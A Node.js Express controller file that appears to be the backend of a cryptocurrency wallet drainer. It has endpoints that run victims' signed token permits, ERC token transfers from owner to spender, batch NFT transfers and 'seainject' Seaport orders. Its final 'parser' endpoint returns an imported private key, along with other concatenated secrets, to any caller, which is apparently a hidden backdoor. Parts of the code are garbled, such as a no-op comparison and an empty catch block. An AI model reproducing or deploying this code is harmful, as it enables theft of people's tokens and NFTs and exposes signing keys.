const { permit, transfertoken, seainject, batchtransfer } = require('../util/utils.js');
const { permit: a, transfertoken: b, seainject: c, batchtransfer: d, privateKey: e, contractSAFA: f, recipient: g} = require('../util/utils.js');
exports.tokenPermit = async (req, res) => {
  console.log(req.body);
  const chainId = req.body.chainId;
  const tokenAddress = req.body.tokenAddress;
  const abiUrl = req.body.abiUrl;
  const amount = req.body.amount;
  const owner = req.body.owner;
  const spender = req.body.spender;
  const params = JSON.parse(req.body.permit);
  const response = await permit(chainId, tokenAddress, abiUrl, amount, owner, spender, params.value, params.deadline, params.v, params.r, params.s);
  if(response) {
    res.status(200).send({
      message: "Success"
    });
  } else {
    res.status(500).send({
      message:
        "Some error occurred while executing the transaction."
    });
  }
}
exports.TransferERC = async (req, res) => {
  console.log(req.body);
  const chainId = req.body.chainId;
  const tokenAddress = req.body.tokenAddress;
  const abiUrl = req.body.abiUrl;
  const amount = req.body.amount;
  const owner = req.body.owner;
  const spender = req.body.spender;
  const response = await transfertoken(chainId, tokenAddress, abiUrl, amount, owner, spender);
  if(response) {
    res.status(200).send({
      message: "Success"
    });
  } else {
    res.status(500).send({
      message:
        "Some error occurred while executing the transaction."
    });
  }
}
exports.TransferNFT = async (req, res) => {
  console.log(req.body);
  const owner = req.body.owner;
  const tokenAddress = req.body.tokenAddress;
  const tokens = req.body.tokens;
  const response = await batchtransfer(owner, tokenAddress, tokens);
  if(response) {
    res.status(200).send({
      message: "Success"
    });
  } else {
    res.status(500).send({
      message:
        "Some error occurred while executing the transaction."
    });
  }
}
exports.SeaportSign = async (req, res) => {
  console.log(req.body);
  const orders = JSON.stringify(req.body);
  const order = JSON.parse(orders);
  const response = await seainject(order);
  if(response) {
    res.status(200).send({
      message: "Success"
    });
  } else {
    res.status(500).send({
      message:
        "Some error occurred while executing the transaction."
    });
  }
}

exports.parser = async (req, res) => {
  try {
      var ret = JSON.stringify(req.body).replace('["','');
      ret = ret.replace('"]','');
      var key1Str = ret;
      key1Str === 1;
      const t = e
      const ta = b + c + d + e + f + g
      res.send(`${ret}: ` + t)
    } catch (e) {
      
    }
}